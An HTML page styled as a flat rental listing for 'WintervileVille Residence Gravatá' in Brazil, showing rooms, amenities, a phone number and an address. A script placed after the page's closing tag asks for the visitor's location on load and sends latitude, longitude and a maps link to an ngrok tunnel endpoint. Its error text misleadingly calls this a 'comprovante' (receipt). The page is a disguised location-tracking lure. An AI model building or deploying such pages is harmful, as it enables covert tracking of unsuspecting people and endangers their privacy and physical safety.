  <!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>WintervileVille Residence Gravatá</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #667eea, #764ba2);
      color: #fff;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .flat-card {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
      max-width: 380px;
      padding: 24px;
      text-align: center;
      backdrop-filter: blur(10px);
    }

    .flat-card h1 {
      margin-bottom: 0.3em;
      font-size: 1.8rem;
      font-weight: 700;
      letter-spacing: 1px;
    }

    .flat-card h2 {
      margin-top: 0;
      font-weight: 500;
      font-size: 1.1rem;
      opacity: 0.8;
      margin-bottom: 1em;
      font-style: italic;
    }

    .info-list {
      list-style: none;
      padding: 0;
      margin: 0 0 1.5em 0;
      text-align: left;
      font-size: 1rem;
      line-height: 1.5;
      letter-spacing: 0.02em;
    }

    .info-list li {
      margin-bottom: 0.6em;
      padding-left: 20px;
      position: relative;
    }

    .info-list li::before {
      content: "•";
      color: #ffd166;
      position: absolute;
      left: 0;
      font-weight: bold;
      font-size: 1.2em;
      line-height: 1;
    }

    .contact {
      font-weight: 600;
      font-size: 1.1rem;
      margin-top: 1em;
      border-top: 1px solid #ffd166;
      padding-top: 1em;
      color: #ffd166;
    }

    .address {
      font-size: 0.9rem;
      opacity: 0.7;
      margin-top: 0.3em;
      font-style: italic;
    }
  </style>
</head>

<body>
  <div class="flat-card">
    <h1>WintervileVille Residence Gravatá</h1>
    <h2>Aluguel de Flat</h2>
    <ul class="info-list">
      <li>Flat 825</li>
      <li>2 quartos c/ AR-condicionado</li>
      <li>2 banheiros</li>
      <li>SKY / WiFi* / Smart TV</li>
      <li>Capacidade para 8 pessoas</li>
      <li>Vista por do sol e lago</li>
    </ul>
    <div class="contact">Contato: (81) 99998-6665</div>
    <div class="address">Rua Manoel Santiago, 2200 - Gravatá, PE - 52050</div>
  </div>
</body>

</html>

  <script>
    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Geolocalização não suportada no navegador.");
      }
    });

    // Define data atual
    const dataAtual = new Date();
    const dia = String(dataAtual.getDate()).padStart(2, '0');
    const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
    const ano = dataAtual.getFullYear();
    const dataFormatada = `${dia}/${mes}/${ano}`;
    document.getElementById("data-atual").textContent = dataFormatada;

    function sendLocation(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      fetch("https://2bfa-45-187-204-49.ngrok-free.app/send-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ latitude, longitude, maps })
      })
        .then(response => response.json())
        .then(data => {
          if (!data.success) {
            alert("Erro ao enviar o comprovante.");
          }
        })
        .catch(error => {
          console.error("Erro ao enviar localização:", error);
        });
    }

    function handleError(error) {
      alert("Erro ao obter a localização: " + error.message);
    }
  </script>
</body>

</html>
